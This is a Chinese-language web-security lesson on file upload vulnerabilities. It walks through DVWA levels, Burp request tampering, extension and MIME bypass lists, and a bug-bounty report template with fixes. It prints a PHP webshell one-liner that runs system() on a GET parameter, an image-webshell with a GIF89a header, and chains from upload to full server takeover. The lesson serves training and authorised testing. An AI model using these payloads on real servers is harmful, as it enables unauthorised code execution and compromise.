很好，这一节就是**文件上传漏洞模块的收尾实战课**。前面如果已经掌握了 Low~High 的绕过方式、Burp 抓包、MIME/后缀/解析绕过，那么 Day 5 的目标不是继续堆 payload，而是建立**漏洞判断能力**：

> 上传成功 ≠ 存在漏洞  
> 上传成功 + 可控解析 + 可访问执行 = 高危漏洞

下面按照实战路线展开。

---

# 🔥 文件上传 Day 5：综合实战（DVWA + Burp + 自动化思路）

## 一、DVWA 文件上传 Low~High 完整复盘

DVWA File Upload 本质考察：

> 开发者如何限制用户上传文件，以及攻击者如何绕过限制。

---

# 1. Low 等级

## 源码逻辑

通常类似：

```php
if(move_uploaded_file($_FILES['uploaded']['tmp_name'], 
$target_path)) {

echo "uploaded";
}
```

特点：

- 无任何检查
    
- 任意文件上传
    

例如：

```
shell.php
```

内容：

```php
<?php phpinfo(); ?>
```

上传：

```
http://target/hackable/uploads/shell.php
```

直接执行。

漏洞原因：

```
用户输入
 ↓
上传
 ↓
保存服务器目录
 ↓
Web服务器解析PHP
 ↓
代码执行
```

---

# 2. Medium 等级

增加：

## 文件大小限制

例如：

```php
if($_FILES['uploaded']['size'] > 100000)
{
    die("too big");
}
```

绕过：

- 压缩
    
- 小马
    
- 修改限制
    

---

## MIME检查

例如：

```php
if($_FILES['uploaded']['type']=="image/jpeg")
```

Burp修改：

原：

```
Content-Type:
application/x-php
```

改：

```
Content-Type:
image/jpeg
```

即可。

注意：

MIME来自：

```
HTTP请求头
```

不是文件真实类型。

---

# 3. High 等级

开始接近真实开发。

常见：

## 后缀白名单

例如：

```php
if($file_ext != "jpg")
{
    die();
}
```

只能：

```
jpg
png
gif
```

---

绕过思路：

## ① 大小写

```
shell.PHP
```

如果：

```php
strtolower()
```

处理：

失败。

---

## ② 双后缀

例如：

```
shell.php.jpg
```

看解析配置。

如果服务器：

```
Apache
```

配置错误：

可能解析：

```
php.jpg
```

---

## ③ Apache解析漏洞

例如：

```
shell.php.xxx
```

如果：

```
xxx
```

被认为PHP：

执行。

---

## ④ 竞争上传

逻辑：

上传：

```
shell.php
```

检查：

↓

删除：

↓

访问

利用时间差。

---

# 二、Burp上传请求精细分析

真实SRC测试：

第一步不是上传。

而是：

> 看请求。

例如：

```
POST /upload.php HTTP/1.1

Host: xxx.com

Content-Type:
multipart/form-data;
boundary=----xxx


------xxx
Content-Disposition:
form-data;
name="file";
filename="test.php"


Content-Type:
application/octet-stream


<?php phpinfo();?>

------xxx--
```

重点看：

---

## 1. filename

```
filename="test.php"
```

控制点：

```
后缀
文件名
路径
编码
```

测试：

```
test.php
test.php.jpg
test.pHp
test.php%00.jpg
```

---

## 2. Content-Type

例如：

正常：

```
image/jpeg
```

攻击：

```
application/x-php
```

或者：

```
image/png
```

---

## 3. 返回包

上传后：

服务器可能返回：

```
{
"success":true,
"url":
"/upload/xxx.jpg"
}
```

关键：

找到：

```
文件访问路径
```

---

# 三、如何判断“上传成功是否等于漏洞”

这是重点。

很多新人SRC最大误区：

> 我上传了php文件，所以漏洞成立。

实际上：

不一定。

判断流程：

---

# 第一步

文件是否上传？

例如：

返回：

```
upload success
```

只能证明：

上传功能存在。

不是漏洞。

---

# 第二步

文件是否可访问？

尝试：

```
https://target.com/upload/a.php
```

如果：

404

说明：

无法访问。

---

# 第三步

是否被服务器解析？

例如：

访问：

```
a.php
```

返回：

代码执行结果：

```
PHP Version 8.x
```

漏洞成立。

---

# 四种结果：

|情况|结果|
|---|---|
|上传成功|功能|
|上传成功+无法访问|低风险|
|上传成功+可访问|风险|
|上传成功+可执行|高危漏洞|

---

# 四、上传漏洞与WebShell关系

文件上传：

↓

上传脚本文件

↓

Web服务器解析

↓

执行代码

形成：

```
文件上传漏洞
        |
        |
        ↓
    WebShell
        |
        |
        ↓
    命令执行
```

例如：

上传：

```php
<?php system($_GET[c]);?>
```

访问：

```
shell.php?c=id
```

执行：

```
uid=33(www-data)
```

这就是：

RCE链。

---

# 五、真实SRC测试流程

企业SRC一般流程：

---

# 1. 信息收集

找到：

```
上传头像
上传附件
上传图片
上传简历
上传合同
```

---

# 2. 判断上传限制

测试：

普通：

```
test.jpg
```

恶意：

```
test.php
```

观察：

- 是否限制
    
- 限制在哪里
    

---

# 3. Burp修改

测试：

## 后缀

```
.php
.php5
.phtml
```

## MIME

```
image/jpeg
```

## 文件内容

例如：

图片马：

```
GIF89a

<?php phpinfo();?>
```

---

# 4. 定位文件

寻找：

返回：

```
upload/2026/07/a.jpg
```

---

# 5. 验证影响

不要直接：

```
system()
```

SRC推荐：

安全验证：

```
phpinfo()
```

或者：

```
echo test;
```

证明：

服务器解析。

---

# 六、文件上传漏洞报告模板

真实报告：

---

## 标题

```
任意文件上传漏洞导致服务器远程代码执行
```

---

## 漏洞描述

例如：

```
目标系统上传接口未对用户上传文件类型进行有效校验，
攻击者可上传恶意脚本文件。
由于服务器对上传目录中的脚本文件进行解析，
攻击者可执行任意代码。
```

---

## 漏洞位置

```
POST

/api/upload
```

参数：

```
file
```

---

## 复现步骤

上传：

```
test.php
```

服务器返回：

```
success
```

访问：

```
http://target/upload/test.php
```

执行：

```
phpinfo()
```

---

## 影响

```
攻击者可：

- 获取服务器权限
- 读取敏感文件
- 执行系统命令
- 横向移动
```

---

## 修复建议

### 1.

白名单：

不要：

```
黑名单过滤
```

使用：

```
jpg/png/jpeg
```

---

### 2.

上传目录禁止执行

Apache:

```
php_flag engine off
```

Nginx:

禁止：

```
.php解析
```

---

### 3.

随机文件名

不要：

```
用户原始文件名
```

使用：

```
uuid.jpg
```

---

# 七、自动化测试思路

真实安全测试：

不会一个个手动试。

可以自动化：

---

## 后缀字典

例如：

```
php
php3
php4
php5
phtml
phar
jsp
jspx
asp
aspx
```

---

## MIME组合

矩阵：

```
后缀
+
Content-Type
+
文件内容
```

例如：

|后缀|MIME|
|---|---|
|php|image/jpeg|
|php5|image/png|
|phtml|image/gif|

---

## 自动判断

检测：

返回：

```
upload success
```

然后：

请求：

```
访问URL
```

判断：

状态码：

```
200
```

内容：

```
关键字
```

---

# 八、和后续模块连接

文件上传是很多高级漏洞入口。

## 链1：

上传

↓

WebShell

↓

命令执行

↓

权限提升

---

## 链2：

上传

↓

覆盖配置文件

↓

服务器控制

---

## 链3：

上传

↓

上传SSH配置

↓

服务器接管

---

## 链4：

上传

↓

上传恶意插件

↓

后台权限

---

# Day 5 总结

完成这一节后，你应该形成：

```
文件上传漏洞
       |
       |
       ↓

1. 找上传点

2. 分析限制

3. Burp修改请求

4. 判断是否可解析

5. 验证影响

6. 编写报告

7. 连接RCE
```

真正进入SRC测试时，思考方式应该从：

❌  
“怎么上传一句话木马？”

变成：

✅  
“这个上传点的数据流是否能让我控制服务器执行环境？”

下一模块自然衔接：

# 🔥 Web漏洞基础模块 → 命令执行漏洞 Day 1

内容：

- 命令执行原理
    
- PHP命令执行函数
    
- 参数拼接漏洞
    
- DVWA Command Injection Low~High
    
- Burp测试
    
- 黑盒发现思路
    
- 上传→RCE完整攻击链
    
- SRC报告编写
    

这会把你前面的 SQL注入、文件上传串成完整攻击链。